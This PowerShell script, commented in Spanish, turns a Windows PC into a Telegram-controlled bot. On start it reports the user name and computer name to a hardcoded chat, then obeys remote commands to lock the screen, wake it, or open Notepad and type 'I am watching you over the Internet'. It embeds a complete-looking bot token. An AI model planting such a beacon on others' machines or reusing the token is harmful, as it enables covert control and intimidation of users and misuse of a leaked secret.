# ==============================================================================
# CONFIGURACIÓN DEL BOT DE TELEGRAM (Pon tus datos aquí)
# ==============================================================================
$Token  = "8935867266:AAELjvUiJRXauSgYmmHAMmut-SOJWXyYImg" # REEMPLAZA CON TU TOKEN REAL COMPLETO
$ChatID = "1018796719"                                    # REEMPLAZA CON TU CHAT ID REAL COMPLETO

# Construcción de URL fija ultra-estable que acabamos de validar
$URL    = "https://api.telegram.org/bot" + $Token
$MiPC   = $env:COMPUTERNAME
$User   = $env:USERNAME

# Registrar APIs de pantalla de Windows de forma segura
try {
    $MethodDefinition = '[DllImport("user32.dll")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);'
    Add-Type -MemberDefinition $MethodDefinition -Name "Win32Utils" -Namespace "Win32" -ErrorAction SilentlyContinue
} catch {}

# --- NOTIFICAR A TELEGRAM QUE LA PC SE ENCENDIÓ ---
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $MensajeInicio = "🚀 *PC En Línea:* `"$User@$MiPC`""
    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $MensajeInicio; parse_mode = "Markdown" })
} catch {}

$LastUpdateID = 0

# ==============================================================================
# BUCLE PRINCIPAL (Monitoreo de internet constante)
# ==============================================================================
while ($true) {
    try {
        $Updates = Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=15" -Method Get
        
        foreach ($Update in $Updates.result) {
            $LastUpdateID = $Update.update_id + 1
            $TextoRecibido = $Update.message.text
            $RemitenteChatID = $Update.message.chat.id

            if ($RemitenteChatID -eq $ChatID -and $null -ne $TextoRecibido) {
                
                # Procesamiento seguro de comandos en minúsculas
                $Partes = $TextoRecibido -split " "
                $Comando = $Partes[0].ToString().ToLower()
                
                $Destino = "TODOS"
                if ($Partes.Count -gt 1) {
                    $Destino = $Partes[1].ToString().ToUpper()
                }

                if ($Destino -eq $MiPC.ToUpper() -or $Destino -eq "TODOS") {
                    
                    switch ($Comando) {
                        "/pantalla_off" {
                            $rundll = New-Object -ComObject WScript.Shell
                            $rundll.Run("rundll32.exe user32.dll,LockWorkStation")
                            [Win32.Win32Utils]::SendMessage(-1, 0x0112, 0xF170, 2)
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "✅ Pantalla apagada en $MiPC" })
                        }
                        "/pantalla_on" {
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys("{SHIFT}")
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "✅ Pantalla encendida en $MiPC" })
                        }
                        "/notepad" {
                            notepad.exe
                            Start-Sleep -Milliseconds 500
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys("Te estoy observando por Internet... 👀")
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "✅ Bloc de notas abierto en $MiPC" })
                        }
                        "/lista" {
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "👋 Reportándose desde Internet: $User@$MiPC" })
                        }
                    }
                }
            }
        }
    } catch {
        Start-Sleep -Seconds 3
    }
    Start-Sleep -Seconds 2
}

